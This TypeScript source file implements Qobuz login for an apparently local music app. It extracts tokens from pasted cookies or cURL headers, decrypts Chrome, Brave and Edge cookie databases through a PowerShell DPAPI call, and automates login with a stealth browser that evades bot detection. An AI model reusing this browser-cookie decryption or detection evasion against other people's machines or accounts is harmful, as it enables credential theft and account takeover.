import { chromium } from 'playwright-extra';
import stealth from 'puppeteer-extra-plugin-stealth';
import path from 'path';
import fs from 'fs';
import os from 'os';
import crypto from 'crypto';
import Database from 'better-sqlite3';
import { execSync } from 'child_process';
import { QobuzClient } from './client.js';

// Apply stealth plugin to prevent bot detection, fake navigator.webdriver, and fix User Agent
chromium.use(stealth());

/**
 * Universal extractor that parses a raw token, Cookie header, cURL snippet, or JSON cookie export.
 */
export function extractTokenFromInput(input: string): string | null {
  if (!input) return null;
  const text = input.trim();

  // 1. Try parsing JSON (e.g., Cookie-Editor / EditThisCookie export format)
  if (text.startsWith('[') || text.startsWith('{')) {
    try {
      const parsed = JSON.parse(text);
      if (Array.isArray(parsed)) {
        for (const item of parsed) {
          if (item && (item.name === 'user_auth_token' || item.name === 'qobuz_token' || item.name === 'token')) {
            if (item.value) return String(item.value).trim();
          }
        }
      } else if (typeof parsed === 'object') {
        if (parsed.user_auth_token) return String(parsed.user_auth_token).trim();
        if (parsed.userAuthToken) return String(parsed.userAuthToken).trim();
      }
    } catch {}
  }

  // 2. Try regex for user_auth_token in cookie strings (e.g., "user_auth_token=xxxx; other=yyy")
  const cookieMatch = text.match(/(?:^|;\s*|Cookie:\s*|["'])user_auth_token=([^;\s"']+)/i);
  if (cookieMatch && cookieMatch[1]) {
    return decodeURIComponent(cookieMatch[1].trim());
  }

  // 3. Try regex for X-User-Auth-Token header or cURL command (e.g. -H 'x-user-auth-token: xxxx')
  const headerMatch = text.match(/x-user-auth-token[:=]\s*["']?([^"'\s;\\]+)["']?/i);
  if (headerMatch && headerMatch[1]) {
    return headerMatch[1].trim();
  }

  // 4. Try regex for localStorage dump (e.g., "user_auth_token": "xxxx")
  const storageMatch = text.match(/["']user_auth_token["']\s*:\s*["']([^"']+)["']/i);
  if (storageMatch && storageMatch[1]) {
    return storageMatch[1].trim();
  }

  // 5. If it's already a clean alphanumeric/base64 token
  if (/^[a-zA-Z0-9_\-\.]{15,120}$/.test(text)) {
    return text;
  }

  return null;
}

export async function importCookiesOrToken(rawInput: string) {
  const token = extractTokenFromInput(rawInput);
  if (!token) {
    throw new Error('Could not find a valid user_auth_token in the provided input. Make sure you copied the cookie string, cURL header, or raw token.');
  }

  // Verify token works with Qobuz API
  const client = new QobuzClient();
  const user = await client.getUser(token);

  // Save session state to .browser-data
  try {
    const userDataDir = path.resolve(process.cwd(), '.browser-data', 'qobuz');
    if (!fs.existsSync(userDataDir)) {
      fs.mkdirSync(userDataDir, { recursive: true });
    }
    const stateFile = path.join(userDataDir, 'state.json');
    const stateData = {
      cookies: [
        {
          name: 'user_auth_token',
          value: token,
          domain: '.qobuz.com',
          path: '/',
          expires: Date.now() / 1000 + 365 * 24 * 3600,
          httpOnly: false,
          secure: true,
          sameSite: 'Lax',
        },
      ],
      origins: [
        {
          origin: 'https://play.qobuz.com',
          localStorage: [
            { name: 'user_auth_token', value: token },
          ],
        },
      ],
    };
    fs.writeFileSync(stateFile, JSON.stringify(stateData, null, 2));
  } catch (err) {
    console.warn('[Qobuz Auth] Failed to save browser state file:', err);
  }

  return { token, user };
}

/**
 * Directly extracts and decrypts Qobuz session cookies from local Chrome / Brave / Edge SQLite profiles.
 */
export async function readLocalBrowserSession(): Promise<{ token: string; user: any }> {
  const localAppData = process.env.LOCALAPPDATA || path.join(os.homedir(), 'AppData', 'Local');

  const browserPaths = [
    { name: 'Chrome', dir: path.join(localAppData, 'Google', 'Chrome', 'User Data') },
    { name: 'Brave', dir: path.join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data') },
    { name: 'Edge', dir: path.join(localAppData, 'Microsoft', 'Edge', 'User Data') },
  ];

  let foundToken: string | null = null;
  let isLockedError = false;

  for (const browser of browserPaths) {
    if (!fs.existsSync(browser.dir)) continue;

    const localStatePath = path.join(browser.dir, 'Local State');
    if (!fs.existsSync(localStatePath)) continue;

    try {
      const localState = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
      const encryptedKeyBase64 = localState.os_crypt?.encrypted_key;
      if (!encryptedKeyBase64) continue;

      const psCommand = `powershell -NoProfile -Command "$bytes = [Convert]::FromBase64String('${encryptedKeyBase64}'); $dpapi = $bytes[5..($bytes.Length - 1)]; Add-Type -AssemblyName System.Security; $key = [System.Security.Cryptography.ProtectedData]::Unprotect($dpapi, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser); [Convert]::ToBase64String($key)"`;
      const masterKeyBase64 = execSync(psCommand, { encoding: 'utf8' }).trim();
      const masterKey = Buffer.from(masterKeyBase64, 'base64');

      const profileDirs = ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4'];
      for (const p of profileDirs) {
        const cookieDbPath = path.join(browser.dir, p, 'Network', 'Cookies');
        const legacyPath = path.join(browser.dir, p, 'Cookies');
        const sourcePath = fs.existsSync(cookieDbPath) ? cookieDbPath : (fs.existsSync(legacyPath) ? legacyPath : null);

        if (!sourcePath) continue;

        const tempDbPath = path.join(os.tmpdir(), `webdeejay_${browser.name}_${p}_temp.db`);
        try {
          fs.copyFileSync(sourcePath, tempDbPath);
          const db = new Database(tempDbPath, { readonly: true });
          const rows = db.prepare("SELECT host_key, name, value, encrypted_value FROM cookies WHERE host_key LIKE '%qobuz.com%' AND (name = 'user_auth_token' OR name = 'qobuz_token')").all() as Array<{
            name: string;
            value: string;
            encrypted_value: Buffer;
          }>;

          for (const row of rows) {
            if (row.value) {
              foundToken = row.value;
              break;
            }

            if (row.encrypted_value && row.encrypted_value.length > 0) {
              const encBuf = row.encrypted_value;
              const prefix = encBuf.subarray(0, 3).toString();
              if (prefix === 'v10' || prefix === 'v11') {
                const iv = encBuf.subarray(3, 15);
                const ciphertext = encBuf.subarray(15, encBuf.length - 16);
                const authTag = encBuf.subarray(encBuf.length - 16);

                const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
                decipher.setAuthTag(authTag);
                const decrypted = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
                const cookieVal = decrypted.toString('utf8');
                if (cookieVal) {
                  foundToken = cookieVal;
                  break;
                }
              }
            }
          }
          db.close();
          try { fs.unlinkSync(tempDbPath); } catch {}

          if (foundToken) break;
        } catch (dbErr: any) {
          if (dbErr.code === 'EBUSY' || dbErr.message?.includes('busy') || dbErr.message?.includes('locked')) {
            isLockedError = true;
          }
        }
      }
    } catch {}

    if (foundToken) break;
  }

  if (!foundToken) {
    if (isLockedError) {
      throw new Error('Your browser (Chrome/Edge) is currently open and has locked its cookie database. Please either paste your Cookie/cURL header in Option 1, or close Chrome for 2 seconds and try again.');
    }
    throw new Error('No Qobuz session cookies found in local Chrome, Brave, or Edge profiles. Please make sure you are logged into play.qobuz.com in your browser.');
  }

  const client = new QobuzClient();
  const user = await client.getUser(foundToken);
  return { token: foundToken, user };
}

export async function loginQobuzAutomated(email?: string, password?: string, interactive = false) {
  const userDataDir = path.resolve(process.cwd(), '.browser-data', 'qobuz');
  console.log(`[Qobuz Auth] Launching Stealth Playwright (interactive=${interactive})...`);

  const userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36';

  let context;
  try {
    context = await chromium.launchPersistentContext(userDataDir, {
      channel: 'chrome',
      headless: !interactive,
      userAgent,
      viewport: { width: 1280, height: 800 },
      locale: 'en-US',
      args: [
        '--disable-blink-features=AutomationControlled',
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-infobars',
      ],
    });
  } catch {
    context = await chromium.launchPersistentContext(userDataDir, {
      headless: !interactive,
      userAgent,
      viewport: { width: 1280, height: 800 },
      locale: 'en-US',
      args: [
        '--disable-blink-features=AutomationControlled',
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-infobars',
      ],
    });
  }

  let capturedToken: string | null = null;
  const page = context.pages()[0] || (await context.newPage());

  page.on('request', (req) => {
    const headers = req.headers();
    if (headers['x-user-auth-token']) {
      capturedToken = headers['x-user-auth-token'];
      console.log('[Qobuz Auth] Intercepted token from request header:', capturedToken);
    }
  });

  page.on('response', async (res) => {
    if (res.url().includes('api.json/0.2')) {
      try {
        const data = await res.json();
        if (data.user_auth_token) {
          capturedToken = data.user_auth_token;
          console.log('[Qobuz Auth] Intercepted token from API response:', capturedToken);
        }
      } catch {}
    }
  });

  try {
    await page.goto('https://play.qobuz.com/login', { waitUntil: 'domcontentloaded', timeout: 45000 });

    const existingToken = await page.evaluate(() => localStorage.getItem('user_auth_token'));
    if (existingToken) {
      console.log('[Qobuz Auth] Found existing token in localStorage:', existingToken);
      capturedToken = existingToken;
    }

    if (!capturedToken && email && password) {
      console.log('[Qobuz Auth] Clicking login button to open signin form...');
      const loginBtn = await page.$('button.LoginPage__button');
      if (loginBtn) {
        await loginBtn.click();
        await page.waitForTimeout(2000);
      }

      console.log('[Qobuz Auth] Filling email and password...');
      await page.waitForSelector('input[name="_username"]', { timeout: 15000 });
      await page.fill('input[name="_username"]', email);
      await page.fill('input[name="_password"]', password);

      console.log('[Qobuz Auth] Submitting login form...');
      await page.keyboard.press('Enter');
    }

    const startTime = Date.now();
    const timeoutMs = interactive ? 120000 : 35000;

    while (!capturedToken && Date.now() - startTime < timeoutMs) {
      await page.waitForTimeout(1000);
      capturedToken = await page.evaluate(() => {
        return localStorage.getItem('user_auth_token') ||
               sessionStorage.getItem('user_auth_token') ||
               null;
      });

      if (!capturedToken && page.url().includes('play.qobuz.com/discover')) {
        capturedToken = await page.evaluate(async () => {
          return localStorage.getItem('user_auth_token');
        });
      }
    }

    await context.close();

    if (!capturedToken) {
      throw new Error('Authentication timed out or failed to capture Qobuz user auth token. You can also paste your cookie/cURL header directly in Option 1.');
    }

    return capturedToken;
  } catch (err: any) {
    await context.close().catch(() => {});
    throw err;
  }
}
